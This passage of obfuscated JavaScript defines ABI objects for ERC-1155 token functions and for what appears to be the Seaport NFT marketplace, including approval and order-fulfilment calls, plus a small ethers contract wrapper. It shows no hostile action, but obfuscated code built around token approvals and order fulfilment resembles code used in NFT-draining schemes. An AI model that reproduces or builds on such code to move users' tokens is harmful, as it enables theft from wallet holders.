  name: '_approved',
  type: 'bool'
};
const _0x51b870 = {
  anonymous: false,
  inputs: [_0x6e9b26, _0x48a537, _0x4945dd],
  name: "ApprovalForAll",
  type: "event"
};
const _0x3fd897 = {
  indexed: true,
  internalType: "address",
  name: "_operator",
  type: "address"
};
const _0x5abd45 = {
  indexed: true,
  internalType: 'address',
  name: "_from",
  type: "address"
};
const _0x117ff5 = {
  indexed: true,
  internalType: "address",
  name: '_to',
  type: "address"
};
const _0xdd30d6 = {
  indexed: false,
  internalType: "uint256[]",
  name: "_ids",
  type: 'uint256[]'
};
const _0x1bc086 = {
  indexed: false,
  internalType: 'uint256[]',
  name: "_amounts",
  type: "uint256[]"
};
const _0x45eb23 = {
  anonymous: false,
  inputs: [_0x3fd897, _0x5abd45, _0x117ff5, _0xdd30d6, _0x1bc086],
  name: "TransferBatch",
  type: "event"
};
const _0x1d85bf = {
  indexed: true,
  internalType: "address",
  name: '_operator',
  type: "address"
};
const _0x4827fc = {
  indexed: true,
  internalType: 'address',
  name: "_from",
  type: "address"
};
const _0x2ebc68 = {
  indexed: true,
  internalType: "address",
  name: '_to',
  type: "address"
};
const _0x459b23 = {
  indexed: false,
  internalType: "uint256",
  name: "_id",
  type: 'uint256'
};
const _0x289c9b = {
  indexed: false,
  internalType: "uint256",
  name: "_amount",
  type: 'uint256'
};
const _0x3959bc = {
  anonymous: false,
  inputs: [_0x1d85bf, _0x4827fc, _0x2ebc68, _0x459b23, _0x289c9b],
  name: "TransferSingle",
  type: "event"
};
const _0x120d87 = {
  internalType: 'address',
  name: "_owner",
  type: "address"
};
const _0x4d848d = {
  internalType: "uint256",
  name: "_id",
  type: "uint256"
};
const _0x2b53ba = {
  internalType: "uint256",
  name: '',
  type: "uint256"
};
const _0x352bac = {
  inputs: [_0x120d87, _0x4d848d],
  name: "balanceOf",
  outputs: [_0x2b53ba],
  stateMutability: "view",
  type: "function"
};
const _0x1eef46 = {
  internalType: "address[]",
  name: '_owners',
  type: 'address[]'
};
const _0x49ce21 = {
  internalType: 'uint256[]',
  name: "_ids",
  type: "uint256[]"
};
const _0xdf6eab = {
  internalType: "uint256[]",
  name: '',
  type: "uint256[]"
};
const _0x237189 = {
  inputs: [_0x1eef46, _0x49ce21],
  name: "balanceOfBatch",
  outputs: [_0xdf6eab],
  stateMutability: "view",
  type: "function"
};
const _0x13b891 = {
  internalType: "address",
  name: "_owner",
  type: "address"
};
const _0x577c93 = {
  internalType: "address",
  name: "_operator",
  type: "address"
};
const _0xe023d2 = {
  internalType: 'bool',
  name: "isOperator",
  type: 'bool'
};
const _0x294056 = {
  inputs: [_0x13b891, _0x577c93],
  name: "isApprovedForAll",
  outputs: [_0xe023d2],
  stateMutability: "view",
  type: "function"
};
const _0x1f490e = {
  internalType: "address",
  name: "_from",
  type: "address"
};
const _0x3e357d = {
  internalType: "address",
  name: '_to',
  type: "address"
};
const _0x318a94 = {
  internalType: 'uint256[]',
  name: '_ids',
  type: "uint256[]"
};
const _0x124a42 = {
  internalType: 'uint256[]',
  name: "_amounts",
  type: "uint256[]"
};
const _0x57ad24 = {
  internalType: "bytes",
  name: "_data",
  type: "bytes"
};
const _0x2ae113 = {
  inputs: [_0x1f490e, _0x3e357d, _0x318a94, _0x124a42, _0x57ad24],
  name: "safeBatchTransferFrom",
  outputs: [],
  stateMutability: "nonpayable",
  type: 'function'
};
const _0x438e4e = {
  internalType: "address",
  name: "_from",
  type: 'address'
};
const _0x55fcee = {
  internalType: "address",
  name: '_to',
  type: "address"
};
const _0x538aa7 = {
  internalType: "uint256",
  name: '_id',
  type: 'uint256'
};
const _0x104dd8 = {
  internalType: "uint256",
  name: "_amount",
  type: "uint256"
};
const _0x486037 = {
  internalType: 'bytes',
  name: "_data",
  type: 'bytes'
};
const _0x1ffa39 = {
  inputs: [_0x438e4e, _0x55fcee, _0x538aa7, _0x104dd8, _0x486037],
  name: "safeTransferFrom",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x5b40e7 = {
  internalType: "address",
  name: "_operator",
  type: "address"
};
const _0x575faa = {
  internalType: "bool",
  name: "_approved",
  type: "bool"
};
const _0x2bc882 = {
  inputs: [_0x5b40e7, _0x575faa],
  name: "setApprovalForAll",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x5b1765 = {
  internalType: 'bytes4',
  name: "_interfaceID",
  type: 'bytes4'
};
const _0x119fb6 = {
  internalType: "bool",
  name: '',
  type: "bool"
};
const _0x3d7fa2 = {
  inputs: [_0x5b1765],
  name: "supportsInterface",
  outputs: [_0x119fb6],
  stateMutability: "pure",
  type: 'function'
};
class ERC1155Factory {
  ["interface"];
  ['contract'];
  ["abi"] = [_0x51b870, _0x45eb23, _0x3959bc, _0x352bac, _0x237189, _0x294056, _0x2ae113, _0x1ffa39, _0x2bc882, _0x3d7fa2];
  constructor(_0x36bc5b, _0x491608) {
    this["interface"] = new ethers.utils.Interface(this.abi);
    this.contract = new ethers.Contract(_0x36bc5b, this.abi, _0x491608);
  }
}
const _0x388e09 = {
  internalType: "address",
  name: "conduitController",
  type: "address"
};
const _0x312059 = {
  inputs: [_0x388e09],
  stateMutability: "nonpayable",
  type: "constructor"
};
const _0x92c58c = {
  inputs: [],
  name: "BadContractSignature",
  type: "error"
};
const _0x2f1e85 = {
  inputs: [],
  name: "BadFraction",
  type: "error"
};
const _0x4a9272 = {
  internalType: "address",
  name: "token",
  type: 'address'
};
const _0x56c675 = {
  internalType: "address",
  name: "from",
  type: "address"
};
const _0x17245c = {
  internalType: "address",
  name: 'to',
  type: 'address'
};
const _0x3d2e0a = {
  internalType: "uint256",
  name: "amount",
  type: 'uint256'
};
const _0x34e01e = {
  inputs: [_0x4a9272, _0x56c675, _0x17245c, _0x3d2e0a],
  name: "BadReturnValueFromERC20OnTransfer",
  type: 'error'
};
const _0x55d290 = {
  internalType: "uint8",
  name: 'v',
  type: 'uint8'
};
const _0x9f620c = {
  inputs: [_0x55d290],
  name: "BadSignatureV",
  type: "error"
};
const _0x2f21bd = {
  inputs: [],
  name: "ConsiderationCriteriaResolverOutOfRange",
  type: "error"
};
const _0x3cb70e = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x77fd28 = {
  internalType: "uint256",
  name: "considerationIndex",
  type: "uint256"
};
const _0x256657 = {
  internalType: "uint256",
  name: "shortfallAmount",
  type: "uint256"
};
const _0x1d0317 = {
  inputs: [_0x3cb70e, _0x77fd28, _0x256657],
  name: "ConsiderationNotMet",
  type: "error"
};
const _0x543213 = {
  inputs: [],
  name: "CriteriaNotEnabledForItem",
  type: 'error'
};
const _0x2f54c7 = {
  internalType: "address",
  name: 'token',
  type: "address"
};
const _0x5df9cf = {
  internalType: "address",
  name: 'from',
  type: "address"
};
const _0xa5a7f6 = {
  internalType: 'address',
  name: 'to',
  type: 'address'
};
const _0x4aecd5 = {
  internalType: "uint256[]",
  name: "identifiers",
  type: "uint256[]"
};
const _0x305168 = {
  internalType: "uint256[]",
  name: "amounts",
  type: "uint256[]"
};
const _0x47e758 = {
  inputs: [_0x2f54c7, _0x5df9cf, _0xa5a7f6, _0x4aecd5, _0x305168],
  name: "ERC1155BatchTransferGenericFailure",
  type: 'error'
};
const _0x20df6a = {
  internalType: "address",
  name: "account",
  type: "address"
};
const _0x3ce34d = {
  internalType: 'uint256',
  name: "amount",
  type: "uint256"
};
const _0x50ddf7 = {
  inputs: [_0x20df6a, _0x3ce34d],
  name: "EtherTransferGenericFailure",
  type: "error"
};
const _0xb47dcf = {
  inputs: [],
  name: "InexactFraction",
  type: "error"
};
const _0x24f47b = {
  inputs: [],
  name: "InsufficientEtherSupplied",
  type: "error"
};
const _0x298f41 = {
  inputs: [],
  name: "Invalid1155BatchTransferEncoding",
  type: "error"
};
const _0x30c127 = {
  inputs: [],
  name: "InvalidBasicOrderParameterEncoding",
  type: "error"
};
const _0x594011 = {
  internalType: "address",
  name: 'conduit',
  type: "address"
};
const _0x5aec8d = {
  inputs: [_0x594011],
  name: "InvalidCallToConduit",
  type: "error"
};
const _0x1ca7e4 = {
  inputs: [],
  name: "InvalidCanceller",
  type: "error"
};
const _0x578cd1 = {
  internalType: "bytes32",
  name: 'conduitKey',
  type: "bytes32"
};
const _0x6357e9 = {
  internalType: "address",
  name: 'conduit',
  type: "address"
};
const _0x4321ef = {
  inputs: [_0x578cd1, _0x6357e9],
  name: "InvalidConduit",
  type: "error"
};
const _0x47fb3e = {
  inputs: [],
  name: "InvalidERC721TransferAmount",
  type: "error"
};
const _0x706f60 = {
  inputs: [],
  name: "InvalidFulfillmentComponentData",
  type: "error"
};
const _0x46a396 = {
  internalType: "uint256",
  name: 'value',
  type: "uint256"
};
const _0x209d24 = {
  inputs: [_0x46a396],
  name: "InvalidMsgValue",
  type: 'error'
};
const _0x561ce5 = {
  inputs: [],
  name: "InvalidNativeOfferItem",
  type: "error"
};
const _0x3a8449 = {
  inputs: [],
  name: "InvalidProof",
  type: "error"
};
const _0x2f596a = {
  internalType: 'bytes32',
  name: "orderHash",
  type: "bytes32"
};
const _0x1b1d17 = {
  inputs: [_0x2f596a],
  name: "InvalidRestrictedOrder",
  type: "error"
};
const _0x1a24ab = {
  inputs: [],
  name: "InvalidSignature",
  type: 'error'
};
const _0x4b0632 = {
  inputs: [],
  name: "InvalidSigner",
  type: "error"
};
const _0x3a3c59 = {
  inputs: [],
  name: "InvalidTime",
  type: "error"
};
const _0x21e72c = {
  inputs: [],
  name: "MismatchedFulfillmentOfferAndConsiderationComponents",
  type: "error"
};
const _0x377bd2 = {
  internalType: "enum Side",
  name: 'side',
  type: "uint8"
};
const _0x47c23c = {
  inputs: [_0x377bd2],
  name: "MissingFulfillmentComponentOnAggregation",
  type: "error"
};
const _0x1f0176 = {
  inputs: [],
  name: "MissingItemAmount",
  type: "error"
};
const _0x1914a9 = {
  inputs: [],
  name: "MissingOriginalConsiderationItems",
  type: "error"
};
const _0x24a6a7 = {
  internalType: "address",
  name: "account",
  type: 'address'
};
const _0x222438 = {
  inputs: [_0x24a6a7],
  name: "NoContract",
  type: "error"
};
const _0x1a1b87 = {
  inputs: [],
  name: "NoReentrantCalls",
  type: "error"
};
const _0x24ad2f = {
  inputs: [],
  name: "NoSpecifiedOrdersAvailable",
  type: 'error'
};
const _0x5a4425 = {
  inputs: [],
  name: "OfferAndConsiderationRequiredOnFulfillment",
  type: "error"
};
const _0xe3d74d = {
  inputs: [],
  name: "OfferCriteriaResolverOutOfRange",
  type: "error"
};
const _0x56844a = {
  internalType: 'bytes32',
  name: 'orderHash',
  type: 'bytes32'
};
const _0x4c3372 = {
  inputs: [_0x56844a],
  name: "OrderAlreadyFilled",
  type: "error"
};
const _0x360713 = {
  inputs: [],
  name: "OrderCriteriaResolverOutOfRange",
  type: "error"
};
const _0x5b9907 = {
  internalType: 'bytes32',
  name: "orderHash",
  type: "bytes32"
};
const _0x5974c = {
  inputs: [_0x5b9907],
  name: "OrderIsCancelled",
  type: 'error'
};
const _0x4b87fc = {
  internalType: "bytes32",
  name: "orderHash",
  type: "bytes32"
};
const _0x508d6c = {
  inputs: [_0x4b87fc],
  name: "OrderPartiallyFilled",
  type: "error"
};
const _0x4d4174 = {
  inputs: [],
  name: "PartialFillsNotEnabledForOrder",
  type: "error"
};
const _0x4d3747 = {
  internalType: "address",
  name: "token",
  type: 'address'
};
const _0x7751d6 = {
  internalType: "address",
  name: "from",
  type: "address"
};
const _0x4ca05a = {
  internalType: 'address',
  name: 'to',
  type: "address"
};
const _0x3355c8 = {
  internalType: 'uint256',
  name: 'identifier',
  type: "uint256"
};
const _0x567098 = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x4cbc03 = {
  inputs: [_0x4d3747, _0x7751d6, _0x4ca05a, _0x3355c8, _0x567098],
  name: "TokenTransferGenericFailure",
  type: "error"
};
const _0x58dab5 = {
  inputs: [],
  name: "UnresolvedConsiderationCriteria",
  type: "error"
};
const _0x5259b3 = {
  inputs: [],
  name: "UnresolvedOfferCriteria",
  type: "error"
};
const _0x5c6f74 = {
  inputs: [],
  name: "UnusedItemParameters",
  type: "error"
};
const _0x24dbf0 = {
  indexed: false,
  internalType: "uint256",
  name: "newCounter",
  type: "uint256"
};
const _0x5e4a7b = {
  indexed: true,
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0x292d9f = {
  anonymous: false,
  inputs: [_0x24dbf0, _0x5e4a7b],
  name: "CounterIncremented",
  type: 'event'
};
const _0x6a972 = {
  indexed: false,
  internalType: "bytes32",
  name: "orderHash",
  type: "bytes32"
};
const _0x473c2e = {
  indexed: true,
  internalType: 'address',
  name: "offerer",
  type: 'address'
};
const _0x48f04f = {
  indexed: true,
  internalType: "address",
  name: "zone",
  type: "address"
};
const _0x447a36 = {
  anonymous: false,
  inputs: [_0x6a972, _0x473c2e, _0x48f04f],
  name: "OrderCancelled",
  type: "event"
};
const _0x19622b = {
  indexed: false,
  internalType: "bytes32",
  name: 'orderHash',
  type: 'bytes32'
};
const _0x3c65ea = {
  indexed: true,
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0x2ab9bf = {
  indexed: true,
  internalType: "address",
  name: 'zone',
  type: 'address'
};
const _0xf3813f = {
  indexed: false,
  internalType: "address",
  name: 'recipient',
  type: "address"
};
const _0x2ef44a = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x36eefc = {
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x514dd7 = {
  internalType: "uint256",
  name: 'identifier',
  type: 'uint256'
};
const _0x5f2319 = {
  internalType: 'uint256',
  name: "amount",
  type: "uint256"
};
const _0x5991a5 = {
  components: [_0x2ef44a, _0x36eefc, _0x514dd7, _0x5f2319],
  indexed: false,
  internalType: "struct SpentItem[]",
  name: "offer",
  type: "tuple[]"
};
const _0x433056 = {
  internalType: "enum ItemType",
  name: 'itemType',
  type: "uint8"
};
const _0x4336a3 = {
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x26f5f6 = {
  internalType: "uint256",
  name: 'identifier',
  type: 'uint256'
};
const _0x12bf90 = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x2eaa4b = {
  internalType: "address payable",
  name: 'recipient',
  type: 'address'
};
const _0x1fa369 = {
  components: [_0x433056, _0x4336a3, _0x26f5f6, _0x12bf90, _0x2eaa4b],
  indexed: false,
  internalType: "struct ReceivedItem[]",
  name: "consideration",
  type: 'tuple[]'
};
const _0x534cff = {
  anonymous: false,
  inputs: [_0x19622b, _0x3c65ea, _0x2ab9bf, _0xf3813f, _0x5991a5, _0x1fa369],
  name: "OrderFulfilled",
  type: 'event'
};
const _0x45ab01 = {
  indexed: false,
  internalType: "bytes32",
  name: "orderHash",
  type: "bytes32"
};
const _0x530249 = {
  indexed: true,
  internalType: 'address',
  name: "offerer",
  type: "address"
};
const _0x491e4e = {
  indexed: true,
  internalType: "address",
  name: 'zone',
  type: "address"
};
const _0x124e7b = {
  anonymous: false,
  inputs: [_0x45ab01, _0x530249, _0x491e4e],
  name: "OrderValidated",
  type: 'event'
};
const _0x339b2a = {
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0x4c27d0 = {
  internalType: "address",
  name: "zone",
  type: 'address'
};
const _0x59d843 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x506f8e = {
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x3c86b0 = {
  internalType: 'uint256',
  name: "identifierOrCriteria",
  type: 'uint256'
};
const _0x40f82f = {
  internalType: 'uint256',
  name: "startAmount",
  type: "uint256"
};
const _0x533525 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x59468c = {
  components: [_0x59d843, _0x506f8e, _0x3c86b0, _0x40f82f, _0x533525],
  internalType: "struct OfferItem[]",
  name: "offer",
  type: 'tuple[]'
};
const _0xbf0dde = {
  internalType: "enum ItemType",
  name: 'itemType',
  type: 'uint8'
};
const _0x6c1367 = {
  internalType: 'address',
  name: 'token',
  type: "address"
};
const _0x544e0a = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x3fc964 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x4bf2b8 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x1b7a5a = {
  internalType: "address payable",
  name: "recipient",
  type: 'address'
};
const _0x2d1868 = {
  components: [_0xbf0dde, _0x6c1367, _0x544e0a, _0x3fc964, _0x4bf2b8, _0x1b7a5a],
  internalType: "struct ConsiderationItem[]",
  name: "consideration",
  type: "tuple[]"
};
const _0x5414fa = {
  internalType: "enum OrderType",
  name: "orderType",
  type: "uint8"
};
const _0x5a8460 = {
  internalType: "uint256",
  name: 'startTime',
  type: 'uint256'
};
const _0x862713 = {
  internalType: "uint256",
  name: "endTime",
  type: "uint256"
};
const _0x2b78a7 = {
  internalType: "bytes32",
  name: "zoneHash",
  type: "bytes32"
};
const _0x52303d = {
  internalType: "uint256",
  name: "salt",
  type: "uint256"
};
const _0x1c06b6 = {
  internalType: "bytes32",
  name: "conduitKey",
  type: "bytes32"
};
const _0x2f57bf = {
  internalType: "uint256",
  name: "counter",
  type: "uint256"
};
const _0x425783 = {
  components: [_0x339b2a, _0x4c27d0, _0x59468c, _0x2d1868, _0x5414fa, _0x5a8460, _0x862713, _0x2b78a7, _0x52303d, _0x1c06b6, _0x2f57bf],
  internalType: "struct OrderComponents[]",
  name: "orders",
  type: "tuple[]"
};
const _0x295654 = {
  internalType: 'bool',
  name: 'cancelled',
  type: "bool"
};
const _0x3be5a3 = {
  inputs: [_0x425783],
  name: "cancel",
  outputs: [_0x295654],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x4816c3 = {
  internalType: "address",
  name: "offerer",
  type: 'address'
};
const _0x2706b6 = {
  internalType: 'address',
  name: "zone",
  type: "address"
};
const _0x2e702f = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x3f3359 = {
  internalType: "address",
  name: 'token',
  type: "address"
};
const _0x5f0fc9 = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: 'uint256'
};
const _0x105420 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x1769c3 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x958bf8 = {
  components: [_0x2e702f, _0x3f3359, _0x5f0fc9, _0x105420, _0x1769c3],
  internalType: "struct OfferItem[]",
  name: "offer",
  type: "tuple[]"
};
const _0x3b5b26 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x23a283 = {
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x191311 = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x44727b = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x17a804 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x5465e5 = {
  internalType: "address payable",
  name: "recipient",
  type: 'address'
};
const _0x4749f7 = {
  components: [_0x3b5b26, _0x23a283, _0x191311, _0x44727b, _0x17a804, _0x5465e5],
  internalType: "struct ConsiderationItem[]",
  name: "consideration",
  type: 'tuple[]'
};
const _0xf932c8 = {
  internalType: "enum OrderType",
  name: "orderType",
  type: 'uint8'
};
const _0x64e71b = {
  internalType: "uint256",
  name: "startTime",
  type: 'uint256'
};
const _0x20ba59 = {
  internalType: "uint256",
  name: "endTime",
  type: "uint256"
};
const _0x500f9a = {
  internalType: "bytes32",
  name: "zoneHash",
  type: "bytes32"
};
const _0x348b05 = {
  internalType: "uint256",
  name: "salt",
  type: "uint256"
};
const _0x409818 = {
  internalType: 'bytes32',
  name: "conduitKey",
  type: "bytes32"
};
const _0x2a8c48 = {
  internalType: "uint256",
  name: "totalOriginalConsiderationItems",
  type: "uint256"
};
const _0x5947f5 = {
  components: [_0x4816c3, _0x2706b6, _0x958bf8, _0x4749f7, _0xf932c8, _0x64e71b, _0x20ba59, _0x500f9a, _0x348b05, _0x409818, _0x2a8c48],
  internalType: "struct OrderParameters",
  name: "parameters",
  type: 'tuple'
};
const _0x553bf0 = {
  internalType: "uint120",
  name: "numerator",
  type: 'uint120'
};
const _0x2869d0 = {
  internalType: "uint120",
  name: "denominator",
  type: 'uint120'
};
const _0xf8dc34 = {
  internalType: "bytes",
  name: "signature",
  type: "bytes"
};
const _0x5782e3 = {
  internalType: "bytes",
  name: "extraData",
  type: "bytes"
};
const _0x5b5c4a = {
  components: [_0x5947f5, _0x553bf0, _0x2869d0, _0xf8dc34, _0x5782e3],
  internalType: "struct AdvancedOrder",
  name: "advancedOrder",
  type: "tuple"
};
const _0x4b9040 = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x1b262c = {
  internalType: "enum Side",
  name: "side",
  type: "uint8"
};
const _0x21c5f8 = {
  internalType: 'uint256',
  name: 'index',
  type: "uint256"
};
const _0x59b8c5 = {
  internalType: "uint256",
  name: "identifier",
  type: "uint256"
};
const _0xade9f5 = {
  internalType: "bytes32[]",
  name: "criteriaProof",
  type: "bytes32[]"
};
const _0x575816 = {
  components: [_0x4b9040, _0x1b262c, _0x21c5f8, _0x59b8c5, _0xade9f5],
  internalType: "struct CriteriaResolver[]",
  name: "criteriaResolvers",
  type: "tuple[]"
};
const _0x42ce5c = {
  internalType: "bytes32",
  name: "fulfillerConduitKey",
  type: "bytes32"
};
const _0x1d4d38 = {
  internalType: "address",
  name: 'recipient',
  type: "address"
};
const _0x11764a = {
  internalType: "bool",
  name: "fulfilled",
  type: "bool"
};
const _0x39b2f5 = {
  inputs: [_0x5b5c4a, _0x575816, _0x42ce5c, _0x1d4d38],
  name: "fulfillAdvancedOrder",
  outputs: [_0x11764a],
  stateMutability: "payable",
  type: 'function'
};
const _0x53ccd4 = {
  internalType: "address",
  name: 'offerer',
  type: "address"
};
const _0x500f0e = {
  internalType: "address",
  name: 'zone',
  type: 'address'
};
const _0x4f8ba6 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x47e471 = {
  internalType: "address",
  name: 'token',
  type: "address"
};
const _0x354427 = {
  internalType: 'uint256',
  name: "identifierOrCriteria",
  type: 'uint256'
};
const _0x4052d5 = {
  internalType: 'uint256',
  name: "startAmount",
  type: "uint256"
};
const _0xf1fb20 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x37776b = {
  components: [_0x4f8ba6, _0x47e471, _0x354427, _0x4052d5, _0xf1fb20],
  internalType: "struct OfferItem[]",
  name: "offer",
  type: "tuple[]"
};
const _0x8aa6b8 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x121a88 = {
  internalType: "address",
  name: "token",
  type: 'address'
};
const _0x4598fe = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x5e5647 = {
  internalType: "uint256",
  name: "startAmount",
  type: 'uint256'
};
const _0x2b5ffa = {
  internalType: 'uint256',
  name: "endAmount",
  type: 'uint256'
};
const _0x4b73f5 = {
  internalType: "address payable",
  name: "recipient",
  type: "address"
};
const _0x29f81b = {
  components: [_0x8aa6b8, _0x121a88, _0x4598fe, _0x5e5647, _0x2b5ffa, _0x4b73f5],
  internalType: "struct ConsiderationItem[]",
  name: "consideration",
  type: 'tuple[]'
};
const _0x4ba7a8 = {
  internalType: "enum OrderType",
  name: 'orderType',
  type: "uint8"
};
const _0x243d48 = {
  internalType: "uint256",
  name: "startTime",
  type: "uint256"
};
const _0x24ff02 = {
  internalType: "uint256",
  name: "endTime",
  type: "uint256"
};
const _0x342643 = {
  internalType: "bytes32",
  name: "zoneHash",
  type: "bytes32"
};
const _0xa22c18 = {
  internalType: "uint256",
  name: "salt",
  type: 'uint256'
};
const _0x5b03e7 = {
  internalType: "bytes32",
  name: "conduitKey",
  type: "bytes32"
};
const _0x340319 = {
  internalType: "uint256",
  name: "totalOriginalConsiderationItems",
  type: "uint256"
};
const _0x31619c = {
  components: [_0x53ccd4, _0x500f0e, _0x37776b, _0x29f81b, _0x4ba7a8, _0x243d48, _0x24ff02, _0x342643, _0xa22c18, _0x5b03e7, _0x340319],
  internalType: "struct OrderParameters",
  name: 'parameters',
  type: "tuple"
};
const _0xa4bdba = {
  internalType: 'uint120',
  name: "numerator",
  type: "uint120"
};
const _0x3d67ef = {
  internalType: "uint120",
  name: "denominator",
  type: 'uint120'
};
const _0x556562 = {
  internalType: "bytes",
  name: "signature",
  type: "bytes"
};
const _0x5804d5 = {
  internalType: 'bytes',
  name: "extraData",
  type: "bytes"
};
const _0x431ee2 = {
  components: [_0x31619c, _0xa4bdba, _0x3d67ef, _0x556562, _0x5804d5],
  internalType: "struct AdvancedOrder[]",
  name: "advancedOrders",
  type: "tuple[]"
};
const _0x4ba2b6 = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x4116b5 = {
  internalType: "enum Side",
  name: "side",
  type: 'uint8'
};
const _0x59c451 = {
  internalType: "uint256",
  name: "index",
  type: "uint256"
};
const _0x3085f6 = {
  internalType: "uint256",
  name: 'identifier',
  type: "uint256"
};
const _0x4cbee0 = {
  internalType: "bytes32[]",
  name: "criteriaProof",
  type: "bytes32[]"
};
const _0x5f5ab7 = {
  components: [_0x4ba2b6, _0x4116b5, _0x59c451, _0x3085f6, _0x4cbee0],
  internalType: "struct CriteriaResolver[]",
  name: "criteriaResolvers",
  type: "tuple[]"
};
const _0x3c8300 = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x4b1bea = {
  internalType: "uint256",
  name: 'itemIndex',
  type: 'uint256'
};
const _0x496945 = {
  components: [_0x3c8300, _0x4b1bea],
  internalType: "struct FulfillmentComponent[][]",
  name: "offerFulfillments",
  type: "tuple[][]"
};
const _0x569a49 = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x197821 = {
  internalType: "uint256",
  name: "itemIndex",
  type: "uint256"
};
const _0x1c4f38 = {
  components: [_0x569a49, _0x197821],
  internalType: "struct FulfillmentComponent[][]",
  name: "considerationFulfillments",
  type: 'tuple[][]'
};
const _0x1b5709 = {
  internalType: "bytes32",
  name: "fulfillerConduitKey",
  type: "bytes32"
};
const _0x5e279e = {
  internalType: "address",
  name: "recipient",
  type: "address"
};
const _0xc4ab7c = {
  internalType: "uint256",
  name: "maximumFulfilled",
  type: "uint256"
};
const _0x1bf91f = {
  internalType: "bool[]",
  name: "availableOrders",
  type: "bool[]"
};
const _0x3ed9c3 = {
  internalType: "enum ItemType",
  name: 'itemType',
  type: "uint8"
};
const _0x29d474 = {
  internalType: 'address',
  name: 'token',
  type: "address"
};
const _0x186aa9 = {
  internalType: 'uint256',
  name: "identifier",
  type: "uint256"
};
const _0x1d3f79 = {
  internalType: "uint256",
  name: 'amount',
  type: "uint256"
};
const _0x3e46cb = {
  internalType: "address payable",
  name: "recipient",
  type: 'address'
};
const _0x38dff6 = {
  components: [_0x3ed9c3, _0x29d474, _0x186aa9, _0x1d3f79, _0x3e46cb],
  internalType: "struct ReceivedItem",
  name: "item",
  type: "tuple"
};
const _0x1cd649 = {
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0x5bc557 = {
  internalType: "bytes32",
  name: 'conduitKey',
  type: "bytes32"
};
const _0x3ea958 = {
  components: [_0x38dff6, _0x1cd649, _0x5bc557],
  internalType: "struct Execution[]",
  name: "executions",
  type: "tuple[]"
};
const _0x22d0ad = {
  inputs: [_0x431ee2, _0x5f5ab7, _0x496945, _0x1c4f38, _0x1b5709, _0x5e279e, _0xc4ab7c],
  name: "fulfillAvailableAdvancedOrders",
  outputs: [_0x1bf91f, _0x3ea958],
  stateMutability: "payable",
  type: 'function'
};
const _0x1e1556 = {
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0x591f95 = {
  internalType: "address",
  name: "zone",
  type: "address"
};
const _0x3868bd = {
  internalType: "enum ItemType",
  name: "itemType",
  type: 'uint8'
};
const _0x326abe = {
  internalType: 'address',
  name: "token",
  type: 'address'
};
const _0x445097 = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x50c4a6 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x4f395a = {
  internalType: "uint256",
  name: 'endAmount',
  type: "uint256"
};
const _0x5800f7 = {
  components: [_0x3868bd, _0x326abe, _0x445097, _0x50c4a6, _0x4f395a],
  internalType: "struct OfferItem[]",
  name: "offer",
  type: 'tuple[]'
};
const _0x194e67 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: 'uint8'
};
const _0x5cf4ad = {
  internalType: 'address',
  name: "token",
  type: 'address'
};
const _0x37fbb3 = {
  internalType: 'uint256',
  name: "identifierOrCriteria",
  type: 'uint256'
};
const _0x395623 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x4b4e5a = {
  internalType: "uint256",
  name: "endAmount",
  type: 'uint256'
};
const _0x4c75ce = {
  internalType: "address payable",
  name: "recipient",
  type: "address"
};
const _0x137c4c = {
  components: [_0x194e67, _0x5cf4ad, _0x37fbb3, _0x395623, _0x4b4e5a, _0x4c75ce],
  internalType: "struct ConsiderationItem[]",
  name: "consideration",
  type: "tuple[]"
};
const _0x1d7933 = {
  internalType: "enum OrderType",
  name: "orderType",
  type: "uint8"
};
const _0x1cff68 = {
  internalType: 'uint256',
  name: 'startTime',
  type: "uint256"
};
const _0x182597 = {
  internalType: "uint256",
  name: "endTime",
  type: "uint256"
};
const _0x41a2b2 = {
  internalType: "bytes32",
  name: "zoneHash",
  type: "bytes32"
};
const _0x11c3a1 = {
  internalType: "uint256",
  name: "salt",
  type: "uint256"
};
